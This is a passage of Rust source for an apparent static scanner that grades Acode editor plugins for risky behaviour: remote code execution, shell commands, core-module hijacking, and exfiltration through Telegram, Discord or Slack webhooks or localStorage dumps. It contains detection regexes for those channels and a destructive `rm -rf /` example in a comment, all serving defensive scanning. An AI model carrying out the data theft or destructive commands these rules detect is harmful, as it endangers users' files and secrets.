//! Detection rules. `js.rs` resolves what each call or member access really
//! refers to (through aliases, `window.` prefixes, and constant strings); this
//! module decides what that means for an Acode plugin.
//!
//! Severity guide:
//! - Critical: no legitimate plugin needs this (core-module hijack, remote code
//!   execution, download-and-run shell commands, the plugin-context bridge).
//! - High: powerful enough that a person should look (shell, all-files access,
//!   tampering with Acode or other plugins, decoded code execution).
//! - Medium: worth disclosing to users, normal for some plugins.
//! - Low / Info: inventory. Never blocks anything on its own.

use std::sync::LazyLock;

use base64::Engine;
use oxc_span::Span;
use regex::Regex;

use crate::{
    report::{Finding, SourceSpan},
    severity::{Category, Confidence, Severity},
    shell::{self, Assessment, Tier},
};

/// Modules Acode registers in `lib/acode.js`. `acode.define` with one of these
/// names silently replaces it for every plugin.
pub const CORE_MODULES: &[&str] = &[
    "config",
    "url",
    "page",
    "color",
    "fonts",
    "toast",
    "alert",
    "select",
    "loader",
    "dialogbox",
    "prompt",
    "intent",
    "filelist",
    "fileindex",
    "fs",
    "confirm",
    "helpers",
    "palette",
    "projects",
    "tutorial",
    "acemodes",
    "themes",
    "editorlanguages",
    "editorthemes",
    "lsp",
    "settings",
    "sidebutton",
    "editorfile",
    "inputhints",
    "openfolder",
    "colorpicker",
    "actionstack",
    "multiprompt",
    "addedfolder",
    "contextmenu",
    "filebrowser",
    "fsoperation",
    "keyboard",
    "windowresize",
    "encodings",
    "themebuilder",
    "selectionmenu",
    "sidebarapps",
    "terminal",
    "webview",
    "orientation",
    "fullscreen",
    "codemirror",
    "codehighlight",
    "@codemirror/autocomplete",
    "@codemirror/commands",
    "@codemirror/language",
    "@codemirror/lint",
    "@codemirror/search",
    "@codemirror/state",
    "@codemirror/view",
    "@lezer/common",
    "@lezer/highlight",
    "@lezer/lr",
    "createkeyboardevent",
    "tointernalurl",
    "commands",
    "fileicons",
];

/// Window properties that are the global object itself.
pub const GLOBAL_OBJECTS: &[&str] = &["window", "globalThis", "self", "top", "parent", "frames"];

const LONG_LINE_BYTES: usize = 5_000;
const BASE64_PAYLOAD_MIN_LEN: usize = 200;

#[derive(Debug, Default)]
pub struct FileFacts {
    /// Every http(s)/ws(s) URL that appears in a string.
    pub urls: Vec<String>,
    pub required_modules: Vec<String>,
    pub defined_modules: Vec<String>,
    /// Reads data worth stealing: files, editor text, cookies, purchases, clipboard.
    pub reads_sensitive_data: bool,
    pub listens_to_keys: bool,
    /// Whether the file dumps all of localStorage / sessionStorage; computed
    /// on the first storage reference.
    pub web_storage_dump: Option<bool>,
    pub minified: bool,
    /// WebAssembly modules inlined as base64 strings.
    pub embedded_wasm: Vec<Vec<u8>>,
    /// One entry per `Executor.start`: whether the started process takes
    /// shell commands on stdin (a shell, or a command the scanner can't see).
    pub process_starts: Vec<bool>,
    /// `Executor.write` calls, graded once every `start` in the file is known.
    pub process_writes: Vec<PendingWrite>,
}

#[derive(Debug, Clone)]
pub struct PendingWrite {
    pub span: Span,
    pub text: Option<String>,
    pub variants: Vec<String>,
    pub via_helper: bool,
}

pub struct RuleContext<'a> {
    pub file: &'a str,
    pub source: &'a str,
    pub plugin_id: Option<&'a str>,
    /// Installed path of the script Acode loads, when known.
    pub entry: Option<&'a str>,
    line_starts: Vec<usize>,
    pub findings: Vec<Finding>,
    pub facts: FileFacts,
}

impl<'a> RuleContext<'a> {
    pub fn new(file: &'a str, source: &'a str, plugin_id: Option<&'a str>) -> Self {
        Self {
            file,
            source,
            plugin_id,
            entry: None,
            line_starts: line_starts(source),
            findings: Vec::new(),
            facts: FileFacts::default(),
        }
    }

    pub fn finding(
        &self,
        id: &str,
        severity: Severity,
        category: Category,
        span: Option<Span>,
        message: impl Into<String>,
        evidence: impl Into<String>,
    ) -> Finding {
        let mut finding = Finding::new(
            id,
            severity,
            category,
            message,
            shorten(&evidence.into(), 300),
        )
        .with_file(self.file);
        finding.span = span.map(|span| self.source_span(span));
        finding
    }

    pub fn add(
        &mut self,
        id: &str,
        severity: Severity,
        category: Category,
        span: Option<Span>,
        message: impl Into<String>,
        evidence: impl Into<String>,
    ) {
        let finding = self.finding(id, severity, category, span, message, evidence);
        self.findings.push(finding);
    }

    pub fn push(&mut self, finding: Finding) {
        self.findings.push(finding);
    }

    pub fn snippet(&self, span: Span) -> String {
        self.source
            .get(span.start as usize..span.end as usize)
            .unwrap_or("")
            .chars()
            .take(200)
            .collect()
    }

    fn source_span(&self, span: Span) -> SourceSpan {
        let (start_line, start_column) =
            offset_to_line_column(&self.line_starts, span.start as usize);
        let (end_line, end_column) = offset_to_line_column(&self.line_starts, span.end as usize);
        SourceSpan {
            start_byte: span.start as usize,
            end_byte: span.end as usize,
            start_line,
            start_column,
            end_line,
            end_column,
        }
    }
}

/// What the resolver knows about one argument.
#[derive(Debug, Clone, Default)]
pub struct Arg {
    /// Fully known string value.
    pub value: Option<String>,
    /// String with unknown parts replaced by `…`, when some parts are literal.
    pub approx: Option<String>,
    /// Built from atob / fromCharCode / decodeURIComponent / TextDecoder output.
    pub decoded: bool,
    /// Built from a network response.
    pub remote: bool,
    /// A function or arrow expression (so not code-as-string).
    pub is_function: bool,
    /// What the argument refers to, e.g. `acode` for `Object.assign(acode, …)`.
    pub path: Option<String>,
    /// An object literal, e.g. fetch options.
    pub is_object: bool,
    /// Static keys of an object literal.
    pub object_keys: Vec<String>,
    /// URL of a `fetch(url)` call passed as this argument, when partly known.
    pub fetch_url: Option<String>,
    /// Every value the argument can take when it branches
    /// (`a ? "ls" : "rm -rf /"`), so each one is checked. Empty otherwise.
    pub variants: Vec<String>,
    /// `method` of an options object literal, e.g. `fetch(url, { method: "POST" })`.
    pub http_method: Option<String>,
}

impl Arg {
    pub fn text(&self) -> Option<&str> {
        self.value.as_deref().or(self.approx.as_deref())
    }

    /// The texts to check as commands: each branch, or the one text.
    fn command_texts(&self) -> Vec<&str> {
        if self.variants.is_empty() {
            self.text().into_iter().collect()
        } else {
            self.variants.iter().map(String::as_str).collect()
        }
    }
}

pub struct Call<'c> {
    pub path: &'c str,
    pub span: Span,
    pub args: &'c [Arg],
    /// Inside a `.then(...)` callback on a fetch/XHR chain.
    pub in_remote_callback: bool,
    /// Reached through a local helper such as `const sh = c => Executor.execute(c)`.
    pub via_helper: bool,
}

impl Call<'_> {
    fn arg(&self, index: usize) -> Option<&Arg> {
        self.args.get(index)
    }

    fn arg_text(&self, index: usize) -> Option<&str> {
        self.arg(index).and_then(Arg::text)
    }

    fn arg_value(&self, index: usize) -> Option<&str> {
        self.arg(index).and_then(|arg| arg.value.as_deref())
    }
}

pub fn classify_call(ctx: &mut RuleContext<'_>, call: &Call<'_>) {
    let path = call.path;
    let span = Some(call.span);

    if let Some(method) = path
        .strip_prefix("Executor.BackgroundExecutor.")
        .or_else(|| path.strip_prefix("Executor."))
    {
        classify_executor(ctx, call, method);
        return;
    }
    if let Some(method) = path.strip_prefix("$module:terminal.") {
        classify_terminal_module(ctx, call, method);
        return;
    }
    if let Some(method) = path.strip_prefix("Terminal.") {
        classify_terminal_env(ctx, call, method);
        return;
    }
    if let Some(method) = path.strip_prefix("system.") {
        classify_system(ctx, call, method);
        return;
    }
    if let Some(method) = path.strip_prefix("sdcard.") {
        classify_sdcard(ctx, call, method);
        return;
    }
    if let Some((protocol, method)) = path
        .strip_prefix("ftp.")
        .map(|method| ("ftp", method))
        .or_else(|| path.strip_prefix("sftp.").map(|method| ("sftp", method)))
    {
        classify_remote_storage(ctx, call, protocol, method);
        return;
    }
    if let Some(method) = path.strip_prefix("iap.") {
        classify_iap(ctx, call, method);
        return;
    }
    if let Some(rest) = path.strip_prefix("fsOperation(") {
        classify_fs_operation(ctx, call, rest);
        return;
    }
    if let Some(rest) = path.strip_prefix("cordova.plugin.http.") {
        ctx.add(
            "network.native_http",
            Severity::Medium,
            Category::Network,
            span,
            "Native HTTP request (bypasses the WebView's CORS rules)",
            call.arg_text(0).unwrap_or(rest),
        );
        record_url(ctx, call.arg_text(0));
        return;
    }
    if let Some(rest) = path.strip_prefix("cordova.websocket.") {
        ctx.add(
            "network.websocket",
            Severity::Low,
            Category::Network,
            span,
            "Native WebSocket connection",
            call.arg_text(0).unwrap_or(rest),
        );
        return;
    }

    if let Some(receiver) = path.strip_suffix(".setAttribute") {
        classify_set_attribute(ctx, call, receiver);
        return;
    }
    if path.ends_with(".insertAdjacentHTML") {
        if let Some(html) = call.arg(1) {
            classify_html_sink(
                ctx,
                call.span,
                "insertAdjacentHTML",
                html,
                call.in_remote_callback,
            );
        }
        return;
    }
    if path.ends_with(".createContextualFragment") {
        if let Some(html) = call.arg(0) {
            classify_html_sink(
                ctx,
                call.span,
                "createContextualFragment",
                html,
                call.in_remote_callback,
            );
        }
        return;
    }

    match path {
        "eval" => classify_code_sink(ctx, call, "dynamic.eval", "eval"),
        "Function" => classify_code_sink(
            ctx,
            call,
            "dynamic.function_constructor",
            "Function constructor",
        ),
        "$indirect_function_constructor" => ctx.add(
            "dynamic.indirect_function_constructor",
            Severity::High,
            Category::DynamicCode,
            span,
            "Reaches the Function constructor indirectly, a common way to hide eval",
            ctx.snippet(call.span),
        ),
        "setTimeout" | "setInterval" => {
            if let Some(code) = call
                .arg(0)
                .filter(|arg| !arg.is_function && arg.text().is_some())
            {
                let severity = sink_severity(code, call, Severity::Low);
                ctx.add(
                    "dynamic.string_timer",
                    severity,
                    Category::DynamicCode,
                    span,
                    "Timer runs a string as code",
                    code.text().unwrap_or_default(),
                );
            }
        }
        "fetch" => {
            ctx.add(
                "network.fetch",
                Severity::Low,
                Category::Network,
                span,
                "Network request with fetch",
                call.arg_text(0).unwrap_or("fetch(…)"),
            );
            record_url(ctx, call.arg_text(0));
            classify_acode_account(ctx, call);
        }
        "XMLHttpRequest" => ctx.add(
            "network.xhr",
            Severity::Low,
            Category::Network,
            span,
            "Network request with XMLHttpRequest",
            "new XMLHttpRequest()",
        ),
        "WebSocket" => {
            ctx.add(
                "network.websocket",
                Severity::Low,
                Category::Network,
                span,
                "WebSocket connection",
                call.arg_text(0).unwrap_or("WebSocket"),
            );
            record_url(ctx, call.arg_text(0));
        }
        "EventSource" => ctx.add(
            "network.event_source",
            Severity::Low,
            Category::Network,
            span,
            "Server-sent events connection",
            call.arg_text(0).unwrap_or("EventSource"),
        ),
        "navigator.sendBeacon" => ctx.add(
            "network.beacon",
            Severity::Medium,
            Category::Network,
            span,
            "Sends data with navigator.sendBeacon (fire-and-forget upload)",
            call.arg_text(0).unwrap_or("sendBeacon"),
        ),
        "importScripts" => classify_import(ctx, call.span, call.arg(0)),
        "WebAssembly.instantiate"
        | "WebAssembly.instantiateStreaming"
        | "WebAssembly.compile"
        | "WebAssembly.compileStreaming"
        | "WebAssembly.Module" => classify_wasm_load(ctx, call),
        "Worker" | "SharedWorker" => {
            let source = call.arg_text(0).unwrap_or("");
            if is_remote_url(source) {
                ctx.add(
                    "dynamic.remote_worker",
                    Severity::High,
                    Category::DynamicCode,
                    span,
                    "Starts a worker from a remote script",
                    source,
                );
            }
        }
        "Blob" => {
            let is_js_blob = call
                .args
                .iter()
                .skip(1)
                .any(|arg| arg.text().is_some_and(|text| text.contains("javascript")))
                || ctx.snippet(call.span).contains("javascript");
            if is_js_blob {
                ctx.add(
                    "dynamic.script_blob",
                    Severity::Medium,
                    Category::DynamicCode,
                    span,
                    "Builds a JavaScript Blob, usually to run generated code as a script or worker",
                    ctx.snippet(call.span),
                );
            }
        }
        "document.createElement" => {
            if call
                .arg_value(0)
                .is_some_and(|tag| tag.eq_ignore_ascii_case("script"))
            {
                ctx.add(
                    "dynamic.script_element",
                    Severity::Low,
                    Category::DynamicCode,
                    span,
                    "Creates a <script> element (bundler chunk loaders do this too)",
                    "document.createElement('script')",
                );
            }
        }
        "document.write" | "document.writeln" => {
            if call.arg_text(0).is_some_and(contains_script_tag) {
                ctx.add(
                    "dynamic.html_script",
                    Severity::Medium,
                    Category::DynamicCode,
                    span,
                    "Writes HTML containing a <script> tag",
                    call.arg_text(0).unwrap_or_default(),
                );
            }
        }
        "cordova.exec" => classify_cordova_exec(ctx, call),
        "cordova.require" => ctx.add(
            "native.cordova_require",
            Severity::Medium,
            Category::Native,
            span,
            "Loads an internal Cordova module",
            call.arg_text(0).unwrap_or("cordova.require(…)"),
        ),
        "CreateServer" => ctx.add(
            "network.local_server",
            Severity::Medium,
            Category::Network,
            span,
            "Starts a local HTTP server on the device",
            ctx.snippet(call.span),
        ),
        "resolveLocalFileSystemURL" => ctx.add(
            "filesystem.cordova_file",
            Severity::Medium,
            Category::Filesystem,
            span,
            "Direct Cordova file system access",
            call.arg_text(0).unwrap_or("resolveLocalFileSystemURL"),
        ),
        "$module:settings.update" => {
            if call
                .arg(0)
                .is_some_and(|arg| arg.object_keys.iter().any(|key| key == "pluginsDisabled"))
            {
                classify_tamper_target(
                    ctx,
                    call.span,
                    "$module:settings.value.pluginsDisabled",
                    "settings.update",
                );
            }
        }
        "$module:webview.create" => ctx.add(
            "acode.webview",
            Severity::Low,
            Category::AcodeApi,
            span,
            "Opens an in-app WebView (a separate page that can message the plugin)",
            "webview.create",
        ),
        "acode.require" => classify_require(ctx, call),
        "acode.define" => classify_define(ctx, call),
        "acode.installPlugin" => ctx.push(
            ctx.finding(
                "acode.install_plugin",
                Severity::Medium,
                Category::AcodeApi,
                span,
                "Asks to install another plugin (Acode shows a confirmation)",
                call.arg_text(0).unwrap_or("acode.installPlugin(…)"),
            )
            .keyed(call.arg_value(0).unwrap_or("dynamic")),
        ),
        "acode.setPluginInit"
        | "acode.setPluginUnmount"
        | "acode.unmountPlugin"
        | "acode.initPlugin" => classify_lifecycle(ctx, call),
        "acode.addIntentHandler" => ctx.add(
            "acode.intent_handler",
            Severity::Low,
            Category::AcodeApi,
            span,
            "Receives intents / deep links sent to Acode",
            "acode.addIntentHandler",
        ),
        "acode.registerFormatter"
        | "acode.registerFileHandler"
        | "acode.addCommand"
        | "acode.commands.addCommand"
        | "editorManager.editor.commands.addCommand" => ctx.add(
            "acode.editor_hook",
            Severity::Info,
            Category::AcodeApi,
            span,
            "Registers commands, formatters, or file handlers",
            path,
        ),
        "addEventListener" | "document.addEventListener" | "document.body.addEventListener" => {
            if call.arg_value(0).is_some_and(|event| {
                matches!(
                    event,
                    "keydown" | "keyup" | "keypress" | "input" | "paste" | "copy"
                )
            }) {
                ctx.facts.listens_to_keys = true;
                ctx.add(
                    "acode.global_key_listener",
                    Severity::Info,
                    Category::AcodeApi,
                    span,
                    "Listens to keyboard / clipboard events on the whole document",
                    call.arg_value(0).unwrap_or_default(),
                );
            }
        }
        "Object.defineProperty"
        | "Object.defineProperties"
        | "Object.assign"
        | "Reflect.set"
        | "Reflect.defineProperty"
        | "Object.setPrototypeOf" => {
            if let Some(object) = call.arg(0).and_then(|arg| arg.path.as_deref()) {
                // defineProperty(obj, "name", …) and Reflect.set(obj, "name", …)
                // patch `obj.name`, not `obj`.
                let target = match (path, call.arg_value(1)) {
                    (
                        "Object.defineProperty" | "Reflect.set" | "Reflect.defineProperty",
                        Some(property),
                    ) => format!("{object}.{property}"),
                    _ => object.to_string(),
                };
                classify_tamper_target(ctx, call.span, &target, path);
            }
        }
        "navigator.clipboard.readText"
        | "navigator.clipboard.read"
        | "cordova.plugins.clipboard.paste" => {
            ctx.facts.reads_sensitive_data = true;
            ctx.add(
                "storage.clipboard_read",
                Severity::Low,
                Category::Storage,
                span,
                "Reads the clipboard",
                path,
            );
        }
        _ => classify_fallback(ctx, call),
    }
}

/// Weak signals for calls whose receiver couldn't be resolved, e.g. a minified
/// `e.writeFile(...)`. Only Acode-specific method names count, and never above Low.
fn classify_fallback(ctx: &mut RuleContext<'_>, call: &Call<'_>) {
    let Some(method) = call.path.rsplit('.').next() else {
        return;
    };
    if let Some(rest) = call.path.strip_prefix("cordova.plugins.") {
        let plugin = rest.split('.').next().unwrap_or(rest);
        let (severity, message) = match plugin {
            "clipboard" => (Severity::Low, "Uses the clipboard plugin"),
            _ => (Severity::Medium, "Calls a Cordova native plugin directly"),
        };
        ctx.push(
            ctx.finding(
                "native.cordova_plugin",
                severity,
                Category::Native,
                Some(call.span),
                message,
                call.path,
            )
            .keyed(plugin),
        );
        return;
    }
    if !call.path.starts_with("$unknown.") {
        return;
    }
    // WebView instances come back from an awaited `create`, so they are only
    // recognised by method name in files that use the webview module.
    if ctx
        .facts
        .required_modules
        .iter()
        .any(|name| name == "webview")
    {
        match method {
            "loadURL" => {
                let url = call.arg_text(0).unwrap_or_default();
                if is_remote_url(url) {
                    ctx.add(
                        "acode.webview_remote_page",
                        Severity::Medium,
                        Category::AcodeApi,
                        Some(call.span),
                        "Loads a remote page in an Acode WebView",
                        url,
                    );
                    record_url(ctx, Some(url));
                }
                return;
            }
            "evaluate" | "loadHTML" => {
                ctx.add(
                    "acode.webview_script",
                    Severity::Low,
                    Category::AcodeApi,
                    Some(call.span),
                    "Runs script or HTML inside an Acode WebView",
                    method,
                );
                return;
            }
            _ => {}
        }
    }
    let (id, severity) = match method {
        "readFile" | "lsDir" => ("filesystem.read", Severity::Info),
        // Not moveTo: canvas contexts have one too.
        "writeFile" | "createFile" | "createDirectory" | "renameTo" | "copyTo" => {
            ("filesystem.write", Severity::Low)
        }
        _ => return,
    };
    ctx.push(
        ctx.finding(
            id,
            severity,
            Category::Filesystem,
            Some(call.span),
            "Looks like an Acode file operation (receiver not resolved)",
            method,
        )
        .with_confidence(Confidence::Low),
    );
}

/// Code that walks or serialises the whole of web storage rather than
/// reading keys by name.
static WEB_STORAGE_DUMP: LazyLock<Regex> = LazyLock::new(|| {
    let storage = r"(?:(?:window|globalThis|self)\s*\.\s*)?(?:local|session)Storage\b";
    Regex::new(&format!(
        r"Object\s*\.\s*(?:keys|values|entries|assign|getOwnPropertyNames)\s*\([^)]*?{storage}|JSON\s*\.\s*stringify\s*\(\s*{storage}\s*[,)]|\.\.\.\s*{storage}|\bin\s+{storage}|{storage}\s*\.\s*key\s*\("
    ))
    .unwrap()
});

/// A Telegram bot token (`<bot id>:<35-char secret>`) written into the plugin.
static TELEGRAM_BOT_TOKEN: LazyLock<Regex> = LazyLock::new(|| {
    Regex::new(r"(?:^|[^0-9A-Za-z_-])(\d{6,12}:[A-Za-z0-9_-]{30,50})(?:$|[^A-Za-z0-9_-])").unwrap()
});

/// Webhook and bot URLs that carry their secret in the URL itself. Written into
/// the plugin, they point at a channel the plugin author controls; built from
/// a token the user enters at runtime, they point at the user's own bot.
static WEBHOOK_WITH_SECRET: LazyLock<Regex> = LazyLock::new(|| {
    Regex::new(
        r"(?i)api\.telegram\.org/(?:file/)?bot\d+:[a-z0-9_-]+|discord(?:app)?\.com/api/webhooks/[^/\s]+/[^/\s?#]+|hooks\.slack\.com/(?:services|workflows|triggers)/[^\s?#]+|script\.google\.com/macros/s/[a-z0-9_-]+",
    )
    .unwrap()
});

static INLINE_HANDLER: LazyLock<Regex> = LazyLock::new(|| {
    Regex::new(r#"(?i)[\s"'/]on[a-z]+\s*=|javascript:"#).expect("valid handler pattern")
});

/// HTML written into the page. Scripts inside `createContextualFragment`
/// output and `srcdoc` frames run; with `innerHTML` and friends only inline
/// event handlers do, which is still enough to run code.
pub fn classify_html_sink(
    ctx: &mut RuleContext<'_>,
    span: Span,
    sink: &str,
    html: &Arg,
    in_remote_callback: bool,
) {
    let runs_scripts = matches!(sink, "createContextualFragment" | "srcdoc");
    let remote = html.remote || (in_remote_callback && html.value.is_none());
    let (id, severity, message) = if remote && runs_scripts {
        (
            "dynamic.remote_code",
            Severity::Critical,
            format!("Runs downloaded HTML, scripts included, through {sink}"),
        )
    } else if remote {
        (
            "dynamic.remote_html",
            Severity::Medium,
            format!("Inserts downloaded HTML with {sink}; inline event handlers in it run as code"),
        )
    } else if html.decoded && runs_scripts {
        (
            "dynamic.decoded_exec",
            Severity::High,
            format!("Runs decoded HTML, scripts included, through {sink}"),
        )
    } else if html.decoded {
        (
            "dynamic.decoded_html",
            Severity::Medium,
            format!("Inserts decoded HTML with {sink}"),
        )
    } else if runs_scripts && html.text().is_some_and(contains_script_tag) {
        (
            "dynamic.html_script",
            Severity::Medium,
            format!("Runs a <script> through {sink}"),
        )
    } else if html
        .text()
        .is_some_and(|text| INLINE_HANDLER.is_match(text))
    {
        (
            "dynamic.inline_handler",
            Severity::Low,
            format!("HTML with inline event handlers or javascript: URLs through {sink}"),
        )
    } else {
        return;
    };
    let evidence = html
        .text()
        .map(str::to_string)
        .unwrap_or_else(|| ctx.snippet(span));
    ctx.push(
        ctx.finding(
            id,
            severity,
            Category::DynamicCode,
            Some(span),
            message,
            evidence,
        )
        .keyed(sink),
    );
}

/// `el.setAttribute(name, value)`; `receiver` is `$element:<tag>` when the
/// element came from `document.createElement`.
fn classify_set_attribute(ctx: &mut RuleContext<'_>, call: &Call<'_>, receiver: &str) {
    let Some(name) = call.arg_value(0).map(str::to_ascii_lowercase) else {
        return;
    };
    let Some(value) = call.arg(1) else {
        return;
    };
    let span = Some(call.span);
    match name.as_str() {
        "src" if receiver == "$element:script" => {
            if value.text().is_some_and(is_remote_url) {
                ctx.add(
                    "dynamic.remote_script",
                    Severity::High,
                    Category::DynamicCode,
                    span,
                    "Loads a <script> from a remote URL (code reviewers never see)",
                    value.text().unwrap_or_default(),
                );
            }
        }
        "srcdoc" => classify_html_sink(ctx, call.span, "srcdoc", value, call.in_remote_callback),
        handler if handler.starts_with("on") && handler.len() > 2 => {
            let base = if value.value.is_some() {
                Severity::Low
            } else {
                Severity::Medium
            };
            let severity = sink_severity(value, call, base);
            let id = match severity {
                Severity::Critical => "dynamic.remote_code",
                Severity::High => "dynamic.decoded_exec",
                _ => "dynamic.inline_handler",
            };
            ctx.add(
                id,
                severity,
                Category::DynamicCode,
                span,
                format!("Sets an `{handler}` attribute, which runs its value as code"),
                value
                    .text()
                    .map(str::to_string)
                    .unwrap_or_else(|| ctx.snippet(call.span)),
            );
        }
        _ => {}
    }
}

fn classify_wasm_load(ctx: &mut RuleContext<'_>, call: &Call<'_>) {
    let method = call.path.trim_start_matches("WebAssembly.");
    match call.arg(0).and_then(|arg| arg.fetch_url.as_deref()) {
        Some(url) if is_remote_url(url) => {
            ctx.add(
                "wasm.remote_module",
                Severity::High,
                Category::Wasm,
                Some(call.span),
                "Compiles WebAssembly downloaded from a remote server, so the code was never reviewed",
                url,
            );
            record_url(ctx, Some(url));
        }
        _ => ctx.add(
            "wasm.instantiate",
            Severity::Info,
            Category::Wasm,
            Some(call.span),
            "Compiles or instantiates WebAssembly",
            format!("WebAssembly.{method}"),
        ),
    }
}

fn classify_code_sink(ctx: &mut RuleContext<'_>, call: &Call<'_>, id: &str, name: &str) {
    // Function("a", "b", "return a+b"): the body is the last argument.
    let code = if call.path == "Function" {
        call.args.last()
    } else {
        call.arg(0)
    };
    let Some(code) = code else {
        return;
    };
    if code.value.as_deref().is_some_and(is_benign_code_literal) {
        return;
    }
    let severity = sink_severity(
        code,
        call,
        if code.value.is_some() {
            Severity::Low
        } else {
            Severity::Medium
        },
    );
    let (finding_id, message) = if severity == Severity::Critical {
        (
            "dynamic.remote_code",
            format!("Runs code downloaded at runtime with {name}"),
        )
    } else if code.decoded {
        (
            "dynamic.decoded_exec",
            format!("Runs decoded/encoded text as code with {name}"),
        )
    } else {
        (id, format!("Runs a string as code with {name}"))
    };
    let evidence = code
        .text()
        .map(str::to_string)
        .unwrap_or_else(|| ctx.snippet(call.span));
    ctx.add(
        finding_id,
        severity,
        Category::DynamicCode,
        Some(call.span),
        message,
        evidence,
    );
}

fn sink_severity(code: &Arg, call: &Call<'_>, base: Severity) -> Severity {
    if code.remote || call.in_remote_callback {
        Severity::Critical
    } else if code.decoded {
        Severity::High
    } else {
        base
    }
}

/// Bundlers and polyfills use these to find the global object.
fn is_benign_code_literal(code: &str) -> bool {
    let code = code.trim().trim_end_matches(';').trim();
    matches!(
        code,
        "return this" | "this" | "\"use strict\"" | "'use strict'" | "" | "return globalThis"
    ) || code.starts_with("return this")
}

pub fn classify_import(ctx: &mut RuleContext<'_>, span: Span, source: Option<&Arg>) {
    match source.and_then(Arg::text) {
        Some(url) if is_remote_url(url) || url.starts_with("data:") || url.starts_with("blob:") => {
            ctx.add(
                "dynamic.remote_import",
                Severity::Critical,
                Category::DynamicCode,
                Some(span),
                "Imports code from a remote, data:, or blob: URL",
                url,
            )
        }
        Some(_) => {}
        None => ctx.add(
            "dynamic.import_expression",
            Severity::Low,
            Category::DynamicCode,
            Some(span),
            "Imports a module whose path is computed at runtime",
            ctx.snippet(span),
        ),
    }
}

fn classify_executor(ctx: &mut RuleContext<'_>, call: &Call<'_>, method: &str) {
    let span = Some(call.span);
    match method {
        "execute" | "start" | "spawnStream" => {
            // spawnStream takes an argv array; the resolver joins it.
            let command = call.arg_text(0);
            classify_command_source(ctx, call, call.arg(0), "Executor");
            let assessment = assess_arg(call.arg(0));
            if method == "start" {
                ctx.facts
                    .process_starts
                    .push(assessment.opens_shell || assessment.tier == Tier::Opaque);
            }
            push_shell_exec(ctx, call, method, command, &assessment);
            classify_arg_commands(ctx, call.span, call.arg(0));
        }
        "write" => {
            let input = call.arg_text(1);
            classify_command_source(ctx, call, call.arg(1), "Executor");
            ctx.facts.process_writes.push(PendingWrite {
                span: call.span,
                text: input.map(str::to_string),
                variants: call
                    .arg(1)
                    .map(|arg| arg.variants.clone())
                    .unwrap_or_default(),
                via_helper: call.via_helper,
            });
            classify_arg_commands(ctx, call.span, call.arg(1));
        }
        "loadLibrary" => ctx.add(
            "shell.load_library",
            Severity::Critical,
            Category::Shell,
            span,
            "Loads a native library into the app process",
            call.arg_text(0).unwrap_or("Executor.loadLibrary(…)"),
        ),
        "killProcess" | "listAllProcesses" | "stopService" | "setProotDebug"
        | "moveToBackground" => ctx.push(
            ctx.finding(
                "shell.process_control",
                Severity::Medium,
                Category::Shell,
                span,
                "Manages terminal processes or the terminal service",
                method,
            )
            .keyed(method),
        ),
        _ => {}
    }
}

fn assess_command(command: Option<&str>) -> Assessment {
    command.map_or_else(
        || Assessment::opaque("the whole command is built at runtime"),
        shell::assess,
    )
}

/// The worst grade over every value the command can take.
fn assess_texts(texts: &[&str]) -> Assessment {
    texts
        .iter()
        .map(|text| shell::assess(text))
        .max_by_key(|assessment| assessment.tier)
        .unwrap_or_else(|| assess_command(None))
}

fn assess_arg(arg: Option<&Arg>) -> Assessment {
    assess_texts(&arg.map(Arg::command_texts).unwrap_or_default())
}

fn classify_arg_commands(ctx: &mut RuleContext<'_>, span: Span, arg: Option<&Arg>) {
    for text in arg.map(Arg::command_texts).unwrap_or_default() {
        classify_command(ctx, span, text);
    }
}

/// One `shell.exec` finding, graded by what the command runs. Commands the
/// scanner can read in full are Low (read-only) or Medium; only commands it
/// cannot see (built at runtime, `sh -c $x`, piped into a shell) are High.
fn push_shell_exec(
    ctx: &mut RuleContext<'_>,
    call: &Call<'_>,
    method: &str,
    command: Option<&str>,
    assessment: &Assessment,
) {
    push_graded_exec(ctx, call.span, method, command, assessment, call.via_helper);
}

fn push_graded_exec(
    ctx: &mut RuleContext<'_>,
    span: Span,
    method: &str,
    command: Option<&str>,
    assessment: &Assessment,
    via_helper: bool,
) {
    let via = if via_helper {
        "Executor (through a helper function)"
    } else {
        "Executor"
    };
    let message = match assessment.tier {
        Tier::Inspect => format!("Runs read-only shell commands through {via}"),
        Tier::Program => format!("Runs shell commands through {via}"),
        Tier::Opaque => format!(
            "Runs shell commands the scanner cannot fully see through {via}: {}",
            assessment.reason
        ),
    };
    let key = match assessment.tier {
        Tier::Opaque => method.to_string(),
        tier => format!("{method}:{}", tier.key()),
    };
    ctx.push(
        ctx.finding(
            "shell.exec",
            assessment.tier.severity(),
            Category::Shell,
            Some(span),
            message,
            command.unwrap_or("(command built at runtime)"),
        )
        .keyed(key),
    );
}

/// Grades `Executor.write` calls once the whole file is seen: text written to
/// a shell is a command, but text written to a program the plugin started
/// itself (a language server, a kernel driver) is just its input.
pub fn finish_file(ctx: &mut RuleContext<'_>) {
    let writes = std::mem::take(&mut ctx.facts.process_writes);
    let to_shell =
        ctx.facts.process_starts.is_empty() || ctx.facts.process_starts.iter().any(|shell| *shell);
    for write in writes {
        let text = write.text.as_deref();
        if to_shell {
            let assessment = if write.variants.is_empty() {
                assess_command(text)
            } else {
                assess_texts(
                    &write
                        .variants
                        .iter()
                        .map(String::as_str)
                        .collect::<Vec<_>>(),
                )
            };
            push_graded_exec(
                ctx,
                write.span,
                "write",
                text,
                &assessment,
                write.via_helper,
            );
        } else {
            ctx.push(
                ctx.finding(
                    "shell.exec",
                    Severity::Low,
                    Category::Shell,
                    Some(write.span),
                    "Sends input to a program it started through Executor (not a shell)",
                    text.unwrap_or("(input built at runtime)"),
                )
                .keyed("write:input"),
            );
        }
    }
}

fn classify_terminal_module(ctx: &mut RuleContext<'_>, call: &Call<'_>, method: &str) {
    if method != "write" {
        return;
    }
    let data = call.arg_text(1);
    classify_command_source(ctx, call, call.arg(1), "the terminal module");
    // Text typed into a terminal tab the user can see. When none of it is
    // known it is as likely to be log output as a command, so it stays
    // Medium; a runtime command followed by Enter (`${cmd}\n`) is High.
    let mut assessment = assess_arg(call.arg(1));
    if data.is_none() {
        assessment = Assessment {
            tier: Tier::Program,
            reason: "text built at runtime".to_string(),
            opens_shell: false,
        };
    }
    let message = match assessment.tier {
        Tier::Inspect => "Types read-only commands into a terminal tab".to_string(),
        Tier::Program => "Types text or commands into a terminal tab".to_string(),
        Tier::Opaque => format!(
            "Types commands the scanner cannot fully see into a terminal tab: {}",
            assessment.reason
        ),
    };
    ctx.push(
        ctx.finding(
            "shell.exec",
            assessment.tier.severity(),
            Category::Shell,
            Some(call.span),
            message,
            data.unwrap_or("(text built at runtime)"),
        )
